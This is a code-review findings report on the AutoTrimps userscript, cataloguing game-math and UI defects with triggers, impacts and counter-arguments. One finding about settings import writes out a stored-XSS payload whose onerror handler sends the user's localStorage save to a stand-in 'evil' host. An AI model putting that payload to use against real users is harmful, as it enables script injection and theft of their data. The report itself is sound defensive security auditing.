# Phase 3b Findings — the sim-VISIBLE modules

**Date:** 2026-07-28 · Part of the [exhaustive logic review](../plans/2026-07-28-exhaustive-logic-review.md)

## Why a second sweep

Phase 3 covered the modules with no native-mutator terminus. This one covers the ~16k lines that DO
terminate in one: calc, buildings, jobs, equipment, maps, mapfunctions, mapfunctions-amp, portal,
stance, settings-engine, settings-visibility, import-export, other, query, breedtimer, upgrades.

The brief differed because the coverage situation differs. A gross behavioural break in these
modules WOULD already be red in `baseline-zero`, so the agents were told to hunt what a differential
structurally cannot see: thresholds never reached, unreachable fallbacks, always-true comparisons,
and re-derived game math that has drifted from the clone.

## The headline number

**58 distinct confirmed findings — 14 HIGH, 32 MEDIUM, 12 LOW.** 65 raw went to reproduction;
58 confirmed, 7 refuted.

**56 of the 58 are invisible to `baseline-zero` today.** That is the finding behind the findings.
The differential pins *what AT did*, not *whether it was right* — so wrong-but-stable behaviour was
recorded into the oracle as correct, and the gate now defends it. Several of these will make
`baseline-zero` go RED when fixed. That red is the fix working, not a regression, and it will need
a deliberate re-record with the byte-identity check this repo demands.

## Trust, and what the number actually counts

These are **sites, not root causes**. Several share one cause with each other and with Phase 3:

- `advPerfectCheckbox.checked = ...` is inert — the game's nice-checkbox is a span whose state
  lives in `dataset.checked`. Sites: `mapfunctions-amp.ts:89`, `mapfunctions.ts:341` (four more in
  that file), plus the already-filed `other-praiding.ts:1334`. **One cause.**
- `buyMap()`'s return value discarded, so a refused purchase is treated as a successful one. Sites:
  `mapfunctions-amp.ts:555` and the already-filed `other-praiding.ts:1019`. **One cause.**
- `getPotencyMod` drift — `query.ts:233` and `query.ts:250`, one function.

Read it as "58 places to fix", not "58 independent discoveries". An inflated count is the fastest
way to get a real finding dismissed.

## The one to read first

`calc.ts:681` — `calcEnemyBaseHealth` gates the imp health multiplier on the same `zone < 60`
condition as the break-the-planet factor, so it is skipped at every zone from 60 up. The game
(`config.js:548-550`) has them as independent statements. Measured: the AT/game ratio is exactly
`1/badGuys[name].health` at z>=60 and exactly 1.0 below, producing a 25% discontinuity in the
`calcHDratio` numerator at the z59->z60 boundary with no game rule behind it.

Three things make it more than a transcription slip: AT's **own U2 twin** (`calc.ts:1554`)
transcribes it correctly, so two siblings in one file disagree; the codebase **already documents the
skip** in a `calcSpire` comment and hand-compensates there; and the existing unit net is blind by
fixture construction — `tests/calc.test.ts` injects `badGuys: { Snimp: { health: 1 } }`, which makes
the omitted multiplier identically 1.

---

## HIGH

### mostEfficientHousing mirrors the Hub's population bonus as +500; the game's Hub grants 25000 per housing unit

`src/modules/buildings.ts:503`

**Sim-visible?** No. I decoded all 15 committed saves (tests/fixtures/saves/*.txt via lz-string): every one has `Hub.locked === 1`, so the branch has never executed in a recorded trace. It cannot be reached either — mostEfficientHousing is only called from RbuyBuildings (U2) and the deepest U2 fixture is world 6, while Hub unlocks at U2 z60. The unit tests are blind too: tests/buildings.characterization.test.ts:119, tests/buildings.housingCaps.test.ts:83 and tests/buildings.housingPrice.test.ts:51 all hard-code `Hub = { locked: 1 }`. Zero coverage in both nets.

**Trigger.** Universe 2, Hub unlocked (automatic at U2 zone 60, or via Exterminate). Any tick where RbuyBuildings() runs and mostEfficientHousing() ranks housing. No setting required — the branch is unconditional once Hub.locked === 0.

**Actual.** `let housingBonus = game.buildings[housing].increase.by; if (!game.buildings.Hub.locked) { housingBonus += 500; }` — AT credits each housing purchase with 500 extra population from the Hub. The game grants `Hub.increase.by = 25000` (.trimps-game/config.js:11663), applied per unit in `buildBuilding()` (.trimps-game/main.js:4990-4999: `buildBuilding('Hub', hubAmt * amt)` -> `addMaxHousing(25000 * amt)`), and MORE than that for Collector when Collectology is owned (`hubAmt = autoBattle.oneTimers.Collectology.getHubs()`). The ranking is argmin of `price / (avgProduction * housingBonus)`, so only the RATIO of housingBonus between candidates moves the argmin — and the 50x understatement does not cancel.

**Expected.** The Hub term should be the game's own `game.buildings.Hub.increase.by` (25000), read from the game rather than retyped — and for Collector, scaled by Collectology's getHubs() the same way buildBuilding does. This is a mirrored-game-constant repair, not a balance proposal; like #93 the corrected value changes which buildings AT buys, so it is tuning-gated.

**Impact.** DEFAULT-PATH CODE, BUT DEEP-GAME-ONLY AND LARGELY MASKED BY THE STOCK CAPS.

Who is affected: any Universe 2 player past zone 60 with Exterminate completed — i.e. AT's core U2 audience, on every run, from z60 to the end. No setting needs changing: `RBuyBuildingsNew` defaults to `true` and the Hub clause is unconditional once `Hub.locked === 0`. Universe 1 players are never affected (`Hub` is `blockU1`). Pre-z60 is unaffected (Hub locked, clause skipped).

How badly, honestly graded:
- STOCK SETTINGS: near-inert. Every Collector-vs-X disagreement window opens at an owned-count at or above that type's default `RMax` cap (Resort's opens at exactly 100, the cap), so once the caps bind the candidate set degenerates toward `[Collector]` and the constant cannot move a singleton argmin. The residual effect is confined to the narrow 0.4%-7% wide bands among the small types (Hut-vs-Resort credit 1.0736 AT vs 1.0015 game), which shift at most one purchase.
- ANY RAISED CAP (`-1 = no cap`, a documented first-class setting on all seven types): live and material. AT switches into Collectors ~14 Resorts / ~13 Hotels / ~12 Mansions too early, paying up to ~8.5x the cost for ~1.2x the population. This is exactly the configuration #140 measured as "~4x worse population by z62" and closed WONTFIX — so the fix and #140's conclusion are entangled.
- COLLECTOLOGY: entirely unmodelled. `getHubs()` = `2 + floor((maxEnemyLevel-1)/30)` doubles-or-more the Collector Hub grant (55000+ per unit vs AT's 5500). The corpus has no AutoBattle at all, so this sub-case is unguarded twice over.

Evidence status: ZERO coverage in both nets — 0/15 fixture saves have `Hub.locked === 0` (all `exterminateDone: false`; deepest U2 fixture is z6), and all three `tests/buildings.*.test.ts` files hard-code `Hub: { locked: 1 }`. `baseline-zero` being green says nothing here.

Disposition: this is a mirrored-game-constant repair, not a balance proposal — the fix is to read `game.buildings.Hub.increase.by` (and, for Collector, scale it by `autoBattle.oneTimers.Collectology.getHubs()` the way `buildBuilding` does) instead of retyping a number. But because the corrected value changes WHICH buildings AT buys, it is user-gated tuning per CLAUDE.md, exactly like #93. Cheapest way to make it measurable at all: `scripts/sim/make-fixtures.mjs:307-316` already builds `09-housing-u2` synthetically with every housing type unlocked and 1e9 of each currency; adding `w.unlockBuilding('Hub')` (or `g.buildings.Hub.locked = 0`) there would put this branch under the differential for the first time. Note per CLAUDE.md that doing so moves that fixture's recorded trace, which is not a local re-record.

Filing recommendation: file as its own issue, cross-linked to #93 (which activated it), #140 (whose WONTFIX conclusion it may confound) and #158 (the sibling defect on the adjacent line, deliberately parked). Do NOT bundle it into #158 — this one is independent of the pricing formula (my failing test below uses `scaling: 1`, so it survives any #158 fix).

**Strongest counter-argument considered.** THE DEFAULT `Max*` CAPS MASK IT, AND I COULD NOT BREAK THAT MASK ON STOCK SETTINGS. `mostEfficientHousing`'s target filter is `game.buildings[house].owned < getPageSetting('RMax'+house)`, with defaults Hut/House/Mansion/Hotel/Resort = 100, Gateway = 25, Collector = -1 (settings-defs.ts:859-888). I computed each type's Collector-disagreement window in owned-count and every one starts at or above its own cap: Resort [100,113] vs cap 100 (the window opens at exactly the count where the cap excises the candidate), Hotel [103,115] vs 100, Mansion [110,121] vs 100, Gateway [114,128] vs 25. The repo's own deepest fixture corroborates that the caps really do bind at that depth: `12-warp-u1` at z62 decodes to Hut 100 / House 100 / Mansion 100 / Hotel 100 / Resort 100 / Gateway 25 / Collector 20 — every capped type exactly at cap, and U1's `Max*` defaults are the same numbers. If all of Hut..Gateway sit at cap when Hub unlocks at z60, `housingTargets` collapses to `[Collector]`, the argmin is a singleton, and the value of `housingBonus` cannot change the answer. On that reading the wrong constant is real but inert on the stock path.

Three things stop this from refuting the finding rather than scoping it. (1) The mask is a coincidence of the cap numbers, not a guard — the caps are user-editable and the tooltip documents `-1 = no cap`; the moment any cap is raised the [100,113]-style window is live and AT switches to Collectors ~14 units early. (2) The Hut window is production-ratio dependent (Hut has no gems cost, so `psFood/psGems` enters): at `psFood/psGems <= 4.4` it opens at Hut owned <= 99, i.e. inside the eligible range, and U2 gem production is Tribute-multiplied (`getPsString`, updates.js:2286: `Math.pow(Tribute.increase.by, Tribute.owned)`) with `RMaxTribute` defaulting to -1, so a gems-rich ratio is the normal deep-U2 state. (3) Even fully masked, the constant is wrong, and the mask itself is unmeasured — the closest thing to a measurement is #140 ("uncapping the inert housing steers AT into Collectors, ~4x worse population by z62", closed WONTFIX). That conclusion was reached with `housingBonus` carrying 500; if the Hub term were 25000 the uncapped model would buy ~14 more Resorts before its first Collector. I am flagging that as a hypothesis, not a measured claim — but it means #140's WONTFIX may be an artifact of this constant, which is a reason to file, not to drop.

The other refutation I tested and rejected: "faithful to legacy." The `+500` is verbatim from the imported `legacy/modules/buildings.js:448`. But the same expression's other half (`game.buildings.Hut.increase.by`) was already fixed as a genuine defect in #93, and no version of the game has ever granted 500 per housing unit — so there is no legacy intent to be faithful to, only an unexamined number.

---

### calcEnemyBaseHealth drops the imp health multiplier at z≥60 (badGuys[name].health is trapped inside the `zone < 60` block)

`src/modules/calc.ts:681`

**Sim-visible?** No. The corpus reaches z62 so the wrong value IS computed, but it is baked into the recorded oracle traces — baseline-zero pins what AT did, not whether it was right, so it is green today and would go RED on the fix. calcSpecificEnemyHealth's consumer (stance.ts:64, overkill prediction) is U1-stance-only.

**Trigger.** Any U1 state at zone >= 60. Two distinct wrong answers: (a) calcEnemyHealth() → calcEnemyBaseHealth(world,50,"Snimp") at z62 — Snimp.health is 0.8, so the world-health estimate that feeds calcHDratio is 1/0.8 = 1.25x too HIGH; (b) calcSpecificEnemyHealth → calcEnemyHealthCore with the real cell name — for an Improbability at cell 100 of z62 (health 6) the estimate is 6x too LOW. The deepest fixture in the corpus (z62) sits inside this window.

**Actual.** Lines 679-682 read `if (zone < 60) { health *= 0.75; health *= game.badGuys[name].health; }` — the imp-specific health multiplier is gated on the SAME `zone < 60` condition as the 0.75 break-the-planet factor, so it is silently skipped for every zone at or past 60.

**Expected.** .trimps-game/config.js:548-550 has them as two independent statements: `if (world < 60) amt *= 0.75;` then `if (!ignoreImpStat) amt *= game.badGuys[name].health;`. The imp multiplier applies at every zone. AT's own U2 twin RcalcEnemyBaseHealth (calc.ts:1554-1556) transcribes it correctly — `if (world < 60) amt *= 0.75;` on its own line, then an unconditional `amt *= game.badGuys[name].health;` — so the two siblings in the same file disagree, which is what makes this a transcription slip rather than a modelling choice.

**Impact.** DEFAULT PATH, U1 ONLY, z>=60 ONLY — no setting needed to trigger it, and U2 is unaffected (RcalcEnemyBaseHealth is correct).

DEFAULT-ON, every tick:
- maps.ts:382 `enemyHealth = calcEnemyHealth()` -> maps.ts:402 `enoughDamage = (ourBaseDamage * mapenoughdamagecutoff > enemyHealth)`, cutoff from MapDamageCutoff (settings-defs.ts:1268, default '4'). At z62 AT requires ourBaseDamage > 2.611431e+18 where the game requires > 2.089145e+18 — AT over-demands damage by 25.0% and keeps mapping through a whole band where the game says push. Effective cutoff jumps 4 -> 5 at exactly z60.
- equipment.ts:376/380 `enoughDamageE` — identical shape, same 1.25x, drives equipment buying.

DEFAULT-ON but narrower:
- calcSpecificEnemyHealth -> stance.ts:64 oneShotPower (overkill prediction). AutoStance default is 1 = 'Auto Stance' (settings-defs.ts:2210-2214), so it renders and runs. Here the error is per-enemy and can be 6x LOW, biasing overkill toward over-optimism. oneShotPower compares the ESTIMATE for neighbours against the REAL `getCurrentEnemy().health` for the current cell on adjacent lines — the same quantity computed two ways, disagreeing above z60.

OPT-IN / INERT by default:
- maps.ts:385 shouldFarm — guarded by `getPageSetting('DisableFarm') > 0`, default -1 (farming off). Inert unless opted in.
- calcHDratio at upgrades.ts:160 (amalcoord) and calc.ts:887/951 (WindStacking) — all behind non-default settings.

COMPENSATED, no impact: Spire zones. calcEnemyHealth ends with `if (game.global.spireActive) health = calcSpire(...)`, and calcSpire re-applies badGuys by hand.

SEVERITY: moderate-but-real and permanent. Real users cross z60 in essentially every run, and the error never goes away above it. Corpus exposure: 2 of 14 fixtures sit inside the window (12-warp-u1 z62, 14-gem-housing-frag-lock-u1 z60) and 1 crosses it (13-z58-gearwall-u1 z58).

SHIPPING CAUTION: the mechanism defect is confirmed, but correcting it changes AT's effective difficulty thresholds at z>=60 for every existing user (their stored MapDamageCutoff was calibrated against the inflated number). Per the sacrosanct-tuning rule this is report-and-gate, not fix-and-ship — file it, let the user decide, and expect the z60/z62 oracle traces to go RED on the fix, which is correct behaviour and not a reason to re-record.

**Strongest counter-argument considered.** THE SELF-CALIBRATION ARGUMENT, and it is genuinely strong for the biggest consumer. calcEnemyHealth ALWAYS passes the literal "Snimp", so above z60 the error is a CONSTANT 1.25x. A user who tunes MapDamageCutoff empirically at z100 by watching AT's own displayed H:D ratio absorbs the constant entirely — threshold and numerator are inflated together and no decision changes. On that reading this is a units artifact, not a defect, and "fixing" it silently re-tunes every existing user's cutoff.

Three things stop it from refuting the claim:

(a) It cannot absorb the DISCONTINUITY. The same MapDamageCutoff is read at z59 (correct) and z60 (25% inflated). Effective cutoff for a user who set 4: z58 4.00, z59 4.00, z60 5.00, z61 5.00, z62 5.00. One threshold cannot be right on both sides of a step no game rule produces.

(b) It does not extend to calcSpecificEnemyHealth at all. That path passes the REAL enemy name, so the error varies per enemy — 1.25x high for a Snimp, 2x low for a Blimp, 6x low for an Improbability. That is not a rescale and no single calibration absorbs it.

(c) The shipped DEFAULT ('MapDamageCutoff' = '4', settings-defs.ts:1268) is an author-chosen number, not a user-derived one, and its own tooltip makes a concrete physical promise — "AutoTrimps expects to one-shot an enemy once your damage times this number exceeds the enemy's health." At z>=60 the number it compares against is not the enemy's health.

The two weaker refutations fail outright. "The sim would have caught it": no — baseline-zero is a differential against oracle traces recorded from a bundle carrying this same code, so it pins what AT DID, not whether AT was right; fixing this makes the z60/z62 traces diverge and turns the net RED, which is the signature of this bug class rather than evidence against it. "Faithful to legacy, therefore intended": faithful yes (verified byte-identical), intended no — the 0.75 break-the-planet factor and the per-imp health stat are causally unrelated quantities with no mechanism by which one would be conditioned on the other; the game gates the imp stat on a parameter; the U2 twin transcribes it correctly; and calcSpire compensates for it by hand with an explanatory comment. That is a mis-transcription someone patched where it hurt most.

---

### getCritMulti / RgetCritMulti price a NON-crit at getMegaCritDamageMult(0) = 1/base instead of 1, so damage is understated up to 5x whenever crit chance < 1

`src/modules/calc.ts:178`

**Sim-visible?** No — inverted. The L0 net boots the real game clone so the real 0.2 IS computed on every fixture (04/09/10 U2 saves and every early U1 save all have critChance 0), but it is what the oracle recorded, so baseline-zero is green precisely because the bug is the baseline. The unit nets are structurally blind because they all stub getMegaCritDamageMult.

**Trigger.** Any state where getPlayerCritChance() has a fractional part and getPlayerCritDamageMult() != the mega-crit base. The worst case is critChance == 0, which is the DEFAULT state: game.portal.Relentlessness ships `level: 0, locked: true` (config.js:2710-2718) and is only unlocked by the z33 upgrade (config.js:10032). Every fresh portal, every pre-z33 U1 run, and every early-U2 run (getPerkLevel returns radLevel in U2 and Relentlessness has none → 0, main.js:2412-2414) therefore has critChance 0 and CritD 1.

**Actual.** `getMegaCritDamageMult(Math.floor(critChance))` with critChance 0 evaluates `Math.pow(base, 0 - 1)` = 1/5 = 0.2 (1/7 = 0.1429 with the Fluffy megaCrit reward, 1/8 with the crit talent). getCritMulti returns 0.2, and calcOurDmg does `avg *= getCritMulti(false)` (line 379), so AT's damage estimate is one fifth of reality and calcHDratio is five times too high. RgetCritMulti (line 1070) is the same code and feeds RcalcOurDmg line 1294.

**Expected.** The game's own comment on the function is explicit: "critTier 1 is yellow and returns 1" (.trimps-game/main.js:16506-16511). Tier 0 means NO crit, and a non-crit hit deals 1x, not 1/base. The expected multiplier for critChance c in [0,1) is (1-c)*1 + c*CritD; the interpolation only needs the mega table from tier 1 upward. The identity ((1-c)*mega(0) + c*mega(1))*CritD == (1-c) + c*CritD holds ONLY when CritD == base, which is why the error vanishes at exactly Relentlessness L10.

**Impact.** DEFAULT PATH, high severity, gated by nothing. `getCritMulti` is called unconditionally from calcOurDmg (calc.ts:378-380) on every tick; there is no setting, universe, or zone gate.

Who is affected: every fresh portal, every U1 run before the z33 Relentlessness unlock, every U1 run at Relentlessness levels 1-9, and essentially all of U2 (getPerkLevel returns radLevel there and Relentlessness has none, so U2 critChance stays 0 until the CritChance mutation / Nurture L5 / 400+ best spire cells / a crit heirloom). The error is 5x at critChance 0 (7x with Fluffy megaCrit, 8x with the crit talent), 1.93x at Relentlessness L1, 1.59x at L2, 1.25x at L4, and vanishes exactly at L10 where CritD == the mega base. It is zero for critChance >= 1 — AT's math is correct there.

Blast: AT's own-damage estimate is understated by that factor, so calcHDratio is overstated by the same factor. That feeds the central mapping decision — `enoughDamage = calcHDratio() <= MapDamageCutoff` (default '4', settings-defs.ts:1264-1268), `shouldFarm = calcHDratio() >= DisableFarm` (maps.ts:385), the Wind-stacking cutoffs (upgrades.ts:166/174, calc.ts:887/951), amalcoord (upgrades.ts:160), fightforever (main-loop.ts:336/556) and the U2 mirrors. A true HD ratio anywhere in (0.8, 4] is reported as (4, 20], i.e. AT declares "want more damage" and goes farming when it already had enough. This is not a saturated threshold.

Corpus coverage: 12 of the 15 fixture saves are at exactly the worst case (5x). Two are at the one point where the model is exact. The proof net cannot flag any of it — the buggy value is what the oracle recorded, and every unit suite stubs getMegaCritDamageMult, so both nets are structurally blind by construction rather than by luck.

Fix cost: the correction itself is a few lines (clamp the low tier's contribution to 1 when floor(critChance) === 0, and drop the CritD factor on the no-crit branch), but it will move traces on 13 fixtures and requires an oracle re-record.

**Strongest counter-argument considered.** "It is a faithful port of the legacy userscript, not a conversion defect." This is factually true — `git show d283f152:legacy/modules/calc.js:158-162` is byte-identical to calc.ts:178-187 minus the fork-added doubleCritFactor, so the bug is inherited, not introduced. Three things defeat it as a refutation. (1) CLAUDE.md's own rule is that AT is structurally immune to what it DELEGATES and drift lives only in the math it RE-DERIVES — this is re-derived math, and it disagrees with .trimps-game by a factor of 5. (2) The repo has already shipped exactly this class of fix in exactly this function: commit 72541426 is titled "AT was underestimating its own damage" and its body names the same downstream consequence ("feeds every downstream HD-ratio / stance / map-vs-world decision"). (3) There is no comment or setting suggesting a deliberate conservative bias; the formula is plainly an expected-value interpolation (it weights by highTierChance) and expected value at tier 0 is unambiguously 1.

The second-strongest: "getMegaCritDamageMult(0) is a legitimate reading of the tier ladder." It is not — the game's own damage-breakdown table (updates.js:3355-3392) renders the sub-1 crit case as exactly two rows, "Crit! chance = critChance, damage = CritD" and the implicit plain row at 1x, and starts its mega loop at check = 1. Every game call site guards tier >= 2. Tier 0 is not a rung on the ladder; it is the absence of a crit.

A real limitation worth stating: the fix has a large blast radius. Correcting the tier-0 branch changes calcHDratio on 13 of 15 fixtures, which will move map/farm/stance traces broadly and force an oracle re-record — and per the project's own note, an oracle re-record is never local. That is a cost argument, not a correctness argument, but it should be planned for rather than discovered.

---

### mostEfficientEquipment never filters `locked`, so U2 AutoEquip commits to Arbalest/Gambeson and buys ZERO gear levels

`src/modules/equipment.ts:715`

**Sim-visible?** NO. This is precisely a stable trace — the oracle 10-hypo-u2.1 has AT buying nothing, and baseline-zero pins that as correct. The bug is deterministic, so a differential over native mutators can never flag it; fixing it would make baseline-zero go RED.

**Trigger.** Universe 2, `Requipon` on, and `game.equipment.Arbalest.locked === 1` / `game.equipment.Gambeson.locked === 1` — i.e. any run before the Slow challenge is completed. Arbalest and Gambeson are unlocked ONLY by `unlockEquipment()` inside `game.challenges.Slow.onComplete` (.trimps-game/config.js:3768-3769, requires clearing z120 with Slow active, and Slow itself needs z129) or by the portal re-unlock at config.js:12322 gated on `game.global.slowDone`. All 15 corpus saves have both locked=1.

**Actual.** The ranking loop at :715 iterates every entry of `RequipmentList` with no `locked` check and picks the max `safeRatio = log(statCalculated+1)/log(nextLevelCost+1)` per slot (:726). Because a locked piece is frozen at prestige 1 / level 0-2 while every unlocked piece's cost has grown by `1.2^level` and by `1.069^(prestigeMod*57+1)` per prestige, the locked pieces win permanently. RautoEquip then blocks the purchase at :856 (`else if (!game.equipment[equipName].locked)`), `keepBuying` stays false, and the `do…while` exits. `mostEfficientEquipment` is a pure function of state, so the same unbuyable winner is re-picked every tick, forever — AT levels no weapon and no armour at all.

**Expected.** Skip locked equipment, exactly as (a) the game's own equivalent ranking `displayEfficientEquipment` does — `.trimps-game/updates.js:5637 if (equip.locked) continue;` — (b) the U1 twin `autoLevelEquipment` does at equipment.ts:385 `if (!gameResource.locked)`, and (c) the sibling in this very file, `estimateEquipsForZone`, does at equipment.ts:945 `if(game.equipment[i].locked !== 0) continue;`.

**Impact.** OPT-IN SETTING, U2-ONLY, but severe inside that population — and structurally unguarded.

Gate: `Requipon` (settings-defs.ts:1125) is `'boolean', false` — default OFF. settings-visibility.ts:441 only renders it when `radonon`, i.e. Universe 2. So U1 is entirely unaffected (U1 uses `autoLevelEquipment`, which correctly filters locked at equipment.ts:385).

Affected population: U2 players who turn AutoEquip on AND have not completed the Slow challenge. Slow requires clearing z120 with Slow active, and Arbalest/Gambeson have no other unlock path (`worldUnlocks` has no entry for either; only config.js:3768-9 and the `slowDone`-gated portal fire at 12322-3). That is effectively *every* U2 player short of a very deep U1 completion — the default state, not an edge case.

Severity when it fires: the armour slot is the bad one. No armour piece can outrank a locked Gambeson until prestige 4, so from a fresh U2 run through prestige 3 AutoEquip's efficiency loop buys zero armour levels. The weapon slot recovers earlier (prestige 2). What masks it from the user is the default-ON `Requip2` block, which keeps every piece at exactly level 2 — so gear is not visibly at zero, it is silently frozen at 2 while the player believes AutoEquip is levelling it.

Corpus exposure: 1 of 12 fixtures (`10-hypo-u2`, the only one with `Requipon: true`). Sim-visible: NO — the oracle trace records the deadlock as correct behaviour (15 events, last at tick 3, zero efficiency-loop purchases across 2000 ticks). Fixing this WILL turn baseline-zero red on that fixture; the red is the fix landing, not a regression. Two unit nets are also blind by construction: tests/equipment.characterization.test.ts:269 lists 'Arbalest' as an acceptable winner, so the golden master pinned the bug rather than catching it.

Adjacent defect found while reproducing (file separately): the `Requip2` block at equipment.ts:822-828 calls native `buyEquipment` on locked pieces with no filter, and native `buyEquipment` (main.js:16730) has no locked check either — so AT levels Arbalest/Gambeson to 2 and banks their stats for a player who has not unlocked them. The tick-0 trace shows both calls.

**Strongest counter-argument considered.** Two, and the first is genuinely load-bearing.

(1) THE DEADLOCK IS NOT PERMANENT, so "buys ZERO gear levels" is wrong as written. Because the game's prestige system inflates stat by 1.19^13 (attack) / 1.19^14 (health) per prestige while inflating cost by only 1.069^57 — and the cost exponent's growth *slows* to 0.85/prestige from prestige 4 (`prestigeMod = p>=4 ? (p-3)*0.85+2 : p-1`, main.js:5904) — every unlocked piece's log-ratio climbs monotonically with prestige and eventually overtakes the frozen locked piece. Sweeping prestige 1-9 with the locked pieces at their steady-state level 2: the attack slot un-starves at prestige 2 (Greatsword/Battleaxe win 5 levels) and the health slot at prestige 4 (Breastplate wins 4). So the true statement is "the efficiency loop buys nothing past level 2 in the starved slot until prestige 2 (weapons) / prestige 4 (armour)", not "forever". The claim's own sweep sentence ("Breastplate never beats a locked Gambeson through P6, and at P8 earns only 4 levels") is also wrong in the other direction — Breastplate first wins at P4 and earns 13 levels at P8.

(2) IT IS A FAITHFUL PORT. `git show 93d39b98^:legacy/modules/equipment.js:857` has the byte-identical unfiltered loop, and the `!locked` buy-site guard at :856 is inherited verbatim too. This is an upstream AutoTrimps defect the strangler carried across, not something the TypeScript conversion introduced — so "the port is wrong" is not the right framing; "upstream is wrong and we inherited it" is.

Neither counter-argument survives as a refutation: the code still nominates a candidate it structurally cannot buy, with no second-choice fallback, over a window covering the entire early U2 game for armour; and CLAUDE.md's standing rule is that a faithful port of a genuine defect is still a genuine defect. What they do is shrink the severity from "AT never buys gear" to "AT's armour buyer is frozen at level 2 until prestige 4".

---

### loadAutoTrimps() applies a pasted settings blob with ZERO validation, and the values it stores reach innerHTML unescaped — arbitrary script execution in page context from a shared "settings string"

`src/modules/import-export.ts:953`

**Sim-visible?** No. The chain terminates in innerHTML, not in any of the 12 wrapped native mutators, and the L0 net never opens a settings tooltip or drives the import textarea. baseline-zero is structurally blind here and cannot be cited.

**Trigger.** User clicks Import/Export → "Import AutoTrimps", pastes a settings string obtained from Discord/a guide, confirms. Payload: {"ATversion":"x","Rdtimefarmmap":"\"><img src=x onerror=\"fetch('https://evil/'+localStorage.trimpSave1)\">"}. Then the user clicks that setting's button (or any of the 302 value/multiValue/textValue controls carrying a payload) to look at it.

**Actual.** loadAutoTrimps() does JSON.parse(a) and one check — `if (null == b) return` — then hands the whole object to resetAutoTrimps(b), which assigns it verbatim: `autoTrimpSettings = d ? d : {}` (:926). createSetting then stores the attacker string as the record's `.value` (the `loaded && id == loaded.id` guard fails for a bare string, so the record is rebuilt with `value: loaded`). settings-engine.ts:387/:409 splice that value into a double-quoted HTML attribute and assign it to `tipText.innerHTML`, so the payload breaks out of value="…" and the injected onerror runs in page context (@grant none) with full access to game state, trimpSave1 and every localStorage key. The same file's own export tooltip (:183) is a second sink: `"…<textarea id='exportArea' …>" + serializeSettings() + "</textarea>"`, where a stored value containing `</textarea>` closes the element and injects markup.

**Expected.** The import must validate before it stores, exactly the way the #76B sibling parseModuleVars() (:1120) already does for the OTHER paste box in this same file: reject anything that is not a plain object; reject keys not in definedSettingIds; require each value to be a JSON literal whose shape matches the setting's declared type; reject atomically. Failing that, escape at the two innerHTML seams. The module already knows this class — escapeHtml() at :169 exists specifically because "they are attacker-influenceable in principle (a bad settings-file import writes them)" — but that escaping is applied only to the cleanup-preview key list, not to the values.

**Impact.** DEFAULT PATH, no setting gates it, and worse than filed — one variant is zero-click.

WHO: any user who pastes a settings string obtained from anyone else. That is the feature's designed use (the repo itself ships third-party preset blobs), and the Import button is an always-present control in the Import/Export tab. Nothing is opt-in; no zone, universe or unlock is required.

HOW BAD, by variant:
- ZERO-CLICK (settings-visibility.ts:1075, multiValue only): payload runs the instant the import is confirmed — resetAutoTrimps calls updateCustomButtons directly at :934 — and again every guiLoop tick. `Praidingzone` is visible on the DEFAULT settings view (radonsettings default 0 → U1/Helium → turnOn). The user never has to click the poisoned control.
- ONE-CLICK (settings-engine.ts:387/:409): 302 of 576 controls. Fires when the user clicks that control to look at or edit it.
- EXPORT TOOLTIP (import-export.ts:183): fires when the user opens Export to copy their string.

CONSEQUENCE: @grant none, no CSP on the game page → arbitrary JS in page context, same origin. Full read of localStorage.trimpSave1 (the save) and every AT setting, plus the ability to silently rewrite the save. The value persists: serializeSettings flattens it back into localStorage, and loadPageVariables restores it on every subsequent boot, so it is stored XSS that survives reload until the user manually resets settings.

SECONDARY (same unguarded gate): a malformed non-object paste (`42`, `[]`, `"hi"`, `false`) passes the null check and throws TypeError at the first createSetting under strict mode — after localStorage.removeItem has already deleted the settings file. Silent total settings loss, no undo.

EVIDENCE POSTURE: structurally invisible to the proof net (innerHTML sink, guiLoop-driven), and untested — tests/import-export.security.test.ts covers only the sibling importModuleVars and cleanupAutoTrimps. This region is unguarded in both senses.

**Strongest counter-argument considered.** "Faithful to legacy, and self-inflicted." The code was relocated verbatim from the upstream AutoTrimps userscript (commit 35a098af, "Phase 2: convert infra group"), so this is inherited behaviour, not fork drift — and the user must voluntarily paste an untrusted blob, which is arguably self-XSS.

Both halves fail. On fidelity: this repo already rejected that defence for this exact class. The sibling paste box in the SAME file, sharing the SAME `importBox` element id and the same tooltip shell, was equally legacy-faithful (it eval()'d) and was hardened under #76B into parseModuleVars() (:1120) with total pre-write validation, PROTO_KEYS blocking and atomic rejection — plus a dedicated regression net whose own test name is "an exfiltration payload is rejected, not run". One box got the treatment; the other was missed.

On self-XSS: importing another person's settings string IS the feature. utils.ts:50/53 ship two third-party preset blobs (serializeSettings60 / serializeSettings550), and settings-engine.ts:64-66 discusses players loading "the shipped '550+ AT Settings' preset" — a shared string from an outside author is the documented workflow. The import tooltip's own copy (import-export.ts:244) reads "Import your AUTOTRIMPS save string! It'll be fine, I promise." — a safety promise the code does not implement, which by this repo's own rule (a description promising behaviour the code does not deliver) is itself a finding.

The weakest remaining point is severity framing, not existence: exploitation needs a social-engineering step. But the target is a game save the community trades and a same-origin localStorage the attacker exfiltrates in one guiLoop tick.

---

### onDeleteProfile() maps dropdown index → array index as `index - 3` with no lower bound, so deleting from a default option splices a NEGATIVE index and destroys an unrelated saved profile

`src/modules/import-export.ts:160`

**Sim-visible?** No. Pure settings-profile UI on a localStorage key (ATSelectedSettingsProfile) the sim never touches; no native mutator is reached. Nothing in tests/ exercises onDeleteProfile.

**Trigger.** Load the page (initializeSettingsProfiles sets `selectedIndex = 0` = the "Current" option, :62), open Import/Export, click "<Delete Profile", confirm. Same for index 1 ("Reset to Default") and 2 ("Save New…", which is also where the dropdown lands after cancelling a name entry).

**Actual.** `var target = (index-3); oldpresets.splice(target, 1);` — with index 0/1/2 target is -3/-2/-1 and Array.prototype.splice counts from the END. With 5 saved profiles, deleting while "Current" is selected removes profile #2; while "Reset to Default" is selected removes #3; while "Save New…" is selected removes the LAST one. Meanwhile the confirmation tooltip (:895) says `You are about to delete the <B><U>${settingsProfiles.value}</B></U> settings profile` — for index 0 that reads "delete the Current settings profile". The preceding `$settingsProfiles.options.remove(index)` (:153) also removes the "Current"/"Reset"/"Save New…" option from the dropdown, permanently shifting every later index by one, so every subsequent delete in that page session targets the wrong row too.

**Expected.** Guard the mapping: if `index < 3` the selection is not a profile and the whole handler must no-op (ideally the Delete button should be inert / the confirm suppressed for the three default options). The stored array must never be spliced at a negative index.

